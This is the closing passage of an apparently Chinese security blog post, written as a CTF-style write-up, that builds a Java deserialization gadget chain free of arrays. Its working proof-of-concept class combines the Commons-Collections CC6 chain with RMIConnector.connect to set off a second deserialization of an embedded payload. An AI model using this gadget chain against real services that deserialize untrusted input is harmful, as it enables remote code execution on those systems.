<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>RMIConnector connector = <span style="color:#6ab825;font-weight:bold">new</span> RMIConnector(<span style="color:#6ab825;font-weight:bold">new</span> JMXServiceURL(<span style="color:#ed9d13">&#34;service:jmx:iiop://127.0.0.1:8000/stub/{$payload}&#34;</span>, <span style="color:#6ab825;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">new</span> InvokerTransformer(<span style="color:#ed9d13">&#34;connect&#34;</span>, <span style="color:#6ab825;font-weight:bold">null</span>, <span style="color:#6ab825;font-weight:bold">null</span>).<span style="color:#bbb">transform</span>(connector);                                     
</span></span></code></pre></div><p>这里极为巧合的是，由于我们的Gadget不能含有任何数组类型的对象，所以<code>InvokeTransformer</code>调用的方法也不能有任何的参数，因为如果有参数的话，必然要设置<code>paramTypes</code>和<code>args</code>两个数组类型的参数，导致Gadget不可用：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#447fcf">InvokerTransformer</span>(String methodName, Class[] paramTypes, Object[] args) {
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">iMethodName</span> = methodName;
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">iParamTypes</span> = paramTypes;
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">iArgs</span> = args;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>而<code>connect</code>方法正好有一个无参的重载形式，一切都是刚刚好。</p>
<p>所以，我们将CC6和RMIConnector组合起来，构造了一条二次反序列化的Gadget：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#999;font-style:italic">/**
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"> * Double Deserialization
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">POC</span> <span style="color:#6ab825;font-weight:bold">implements</span> Gadget {
</span></span><span style="display:flex;"><span>    <span style="color:#ffa500">@Override</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> Object <span style="color:#447fcf">getExpObject</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#999;font-style:italic">// 二次反序列化的数据，这里使用CC6
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>        String payload = <span style="color:#ed9d13">&#34;rO0ABXNyAB...&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            RMIConnector connector = <span style="color:#6ab825;font-weight:bold">new</span> RMIConnector(<span style="color:#6ab825;font-weight:bold">new</span> JMXServiceURL(<span style="color:#ed9d13">&#34;service:jmx:iiop://127.0.0.1:8000/stub/{$payload}&#34;</span>.<span style="color:#bbb">replace</span>(<span style="color:#ed9d13">&#34;{$payload}&#34;</span>, payload)), <span style="color:#6ab825;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Transformer invokerTransformer = <span style="color:#6ab825;font-weight:bold">new</span> InvokerTransformer(<span style="color:#ed9d13">&#34;getClass&#34;</span>, <span style="color:#6ab825;font-weight:bold">null</span>, <span style="color:#6ab825;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>            java.<span style="color:#bbb">util</span>.<span style="color:#bbb">Map</span> innerMap = <span style="color:#6ab825;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>            Map outerMap = LazyMap.<span style="color:#bbb">decorate</span>(innerMap, invokerTransformer);
</span></span><span style="display:flex;"><span>            TiedMapEntry tiedMapEntry = <span style="color:#6ab825;font-weight:bold">new</span> TiedMapEntry(outerMap, connector);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            HashMap expMap = <span style="color:#6ab825;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>            expMap.<span style="color:#bbb">put</span>(tiedMapEntry, <span style="color:#ed9d13">&#34;value&#34;</span>);
</span></span><span style="display:flex;"><span>            outerMap.<span style="color:#bbb">clear</span>();
</span></span><span style="display:flex;"><span>            SerUtil.<span style="color:#bbb">setFieldValue</span>(invokerTransformer, <span style="color:#ed9d13">&#34;iMethodName&#34;</span>, <span style="color:#ed9d13">&#34;connect&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">return</span> expMap;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        } <span style="color:#6ab825;font-weight:bold">catch</span> (Exception e ){
</span></span><span style="display:flex;"><span>            e.<span style="color:#bbb">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>(String[] args) {
</span></span><span style="display:flex;"><span>        SerUtil.<span style="color:#bbb">unserialize</span>(SerUtil.<span style="color:#bbb">serialize</span>(<span style="color:#6ab825;font-weight:bold">new</span> POC().<span style="color:#bbb">getExpObject</span>()));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">All posts</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents"></nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&text=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&title=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&is_video=false&description=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget&body=Check out this article: https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&title=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&title=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&name=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget&description=%e6%98%a8%e5%a4%a9%e7%a2%b0%e5%88%b0%e4%ba%86%e8%bf%99%e6%a0%b7%e4%b8%80%e4%b8%aa%e9%a2%98%ef%bc%8c%e6%9c%89%e4%b8%80%e4%b8%aa%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e6%8e%a5%e5%8f%a3%ef%bc%8c%e4%bd%86%e6%98%af%e4%bd%bf%e7%94%a8%e4%ba%86%e8%87%aa%e5%ae%9a%e4%b9%89%e7%9a%84MyObjectInputStream%e8%bf%9b%e8%a1%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%ef%bc%9a%0apublic%20class%20MyObjectInputStream%20extends%20ObjectInputStream%20%7b%20%20private%20ClassLoader%20classLoader%3b%20%20%20public%20MyObjectInputStream%28InputStream%20inputStream%29%20throws%20Exception%20%7b%20%20super%28inputStream%29%3b%20%20URL%5b%5d%20urls%20%3d%20%28%28URLClassLoader%29%20Transformer.class.getClassLoader%28%29%29.getURLs%28%29%3b%20%20this.classLoader%20%3d%20new%20URLClassLoader%28urls%29%3b%20%20%7d%20%20%20protected%20Class%26lt%3b%3f%26gt%3b%20resolveClass%28ObjectStreamClass%20desc%29%20throws%20IOException%2c%20ClassNotFoundException%20%7b%20%20Class%20clazz%20%3d%20this.classLoader.loadClass%28desc.getName%28%29%29%3b%20%20return%20clazz%3b%20%20%7d%20%7d%20%e5%ae%83%e9%87%8d%e5%86%99%e4%ba%86%e7%88%b6%e7%b1%bb%e7%9a%84resolveClass%e6%96%b9%e6%b3%95%ef%bc%8c%e4%bd%bf%e7%94%a8loadClass%28%29%e6%96%b9%e6%b3%95%e6%a0%b9%e6%8d%ae%e7%b1%bb%e5%90%8d%e8%8e%b7%e5%8f%96%e7%9b%b8%e5%ba%94%e7%9a%84Class%e5%af%b9%e8%b1%a1%ef%bc%8c%e8%80%8c%e7%88%b6%e7%b1%bb%e9%bb%98%e8%ae%a4%e4%bd%bf%e7%94%a8Class.forName%28%29%e8%bf%9b%e8%a1%8c%e8%bf%99%e4%b8%80%e8%bf%87%e7%a8%8b%ef%bc%8c%e8%bf%99%e4%b8%a4%e8%80%85%e6%9c%80%e5%a4%a7%e7%9a%84%e5%8c%ba%e5%88%ab%e5%b0%b1%e6%98%afloadClass%28%29%e6%96%b9%e6%b3%95%e6%b2%a1%e6%b3%95%e5%8a%a0%e8%bd%bd%e4%bb%bb%e4%bd%95%e6%95%b0%e7%bb%84%e7%b1%bb%e5%9e%8b%e7%9a%84%e5%af%b9%e8%b1%a1%ef%bc%9a%0aClass.forName%28%26%2334%3b%5b%5bB%26%2334%3b%29%3b%09%2f%2f%20class%20%5b%5bB%20ClassLoader.getSystemClassLoader%28%29.loadClass%28%26%2334%3b%5b%5bB%26%2334%3b%29%3b%09%2f%2f%20ClassNotFoundException%20%e8%bf%99%e9%81%93%e9%a2%98%e5%85%b6%e5%ae%9e%e5%b0%b1%e6%98%afshiro-550%e7%9a%84pro%e7%89%88%e6%9c%ac%ef%bc%8c%e5%9c%a8shiro%e7%8e%af%e5%a2%83%e4%b8%8b%e4%b9%9f%e6%9c%89%e6%95%b0%e7%bb%84%e7%9a%84%e9%99%90%e5%88%b6%ef%bc%8c%e4%b8%8d%e8%bf%87%e5%8c%ba%e5%88%ab%e5%9c%a8%e4%ba%8e%ef%bc%9a%0a%20shiro%e7%8e%af%e5%a2%83%e4%b8%8b%e5%8f%aa%e8%83%bd%e5%8a%a0%e8%bd%bdJava%e5%8e%9f%e7%94%9f%e7%b1%bb%e7%9a%84%e6%95%b0%e7%bb%84%e5%af%b9%e8%b1%a1%20%e8%bf%99%e9%81%93%e9%a2%98%e4%b8%8d%e8%83%bd%e5%8a%a0%e8%bd%bd%e4%bb%bb%e4%bd%95%e6%95%b0%e7%bb%84%e5%af%b9%e8%b1%a1%20%20%e5%85%b3%e4%ba%8e%e7%ac%ac%e4%b8%80%e7%82%b9%e7%9a%84%e5%85%b7%e4%bd%93%e5%8e%9f%e5%9b%a0%ef%bc%8c%e5%8f%af%e4%bb%a5%e5%8f%82%e8%80%83P%e7%89%9b%e7%9a%84%e5%b0%8f%e5%af%86%e5%9c%88%ef%bc%8c%e8%bf%99%e9%87%8c%e4%b8%8d%e5%86%8d%e8%b5%98%e8%bf%b0%e3%80%82%e8%bf%99%e9%81%93%e9%a2%98%e7%9a%84%e4%be%9d%e8%b5%96%e6%98%afCC3.2.1%ef%bc%8cCC%e9%93%be%e7%9a%84%e8%a7%a6%e5%8f%91%e6%96%b9%e6%b3%95%e6%9c%89%e4%b8%a4%e4%b8%aa%ef%bc%9a%0a%20Transformer%e6%95%b0%e7%bb%84%e7%9a%84%e9%93%be%e5%bc%8f%e8%b0%83%e7%94%a8%20TeamplatesImpl%e5%8a%a8%e6%80%81%e5%8a%a0%e8%bd%bd%e5%ad%97%e8%8a%82%e7%a0%81%20%20%e7%ac%ac%e4%b8%80%e4%b8%aa%e4%b8%8d%e5%bf%85%e5%a4%9a%e8%af%b4%ef%bc%8c%e7%ac%ac%e4%ba%8c%e4%b8%aa%e5%8a%a0%e8%bd%bd%e7%9a%84_bytecodes%e5%ad%97%e6%ae%b5%e6%98%afbyte%5b%5d%5b%5d%e7%b1%bb%e5%9e%8b%e7%9a%84%ef%bc%8c%e4%b9%9f%e4%bc%9a%e6%b6%89%e5%8f%8a%e5%88%b0%e6%95%b0%e7%bb%84%e7%b1%bb%e5%9e%8b%e5%af%b9%e8%b1%a1%e7%9a%84%e5%8a%a0%e8%bd%bd%ef%bc%8c%e6%89%80%e4%bb%a5%e8%bf%99%e9%81%93%e9%a2%98%e4%bd%bf%e7%94%a8%e5%8e%9f%e7%94%9fCC%e9%93%be%e6%98%af%e6%97%a0%e6%b3%95%e8%a7%a3%e5%87%ba%e7%9a%84%e3%80%82" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&t=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2022  Hello World 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">All posts</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>



  


<script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']]
    },
    svg: {
      fontCache: 'global'
    }
  };
</script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>

</html>
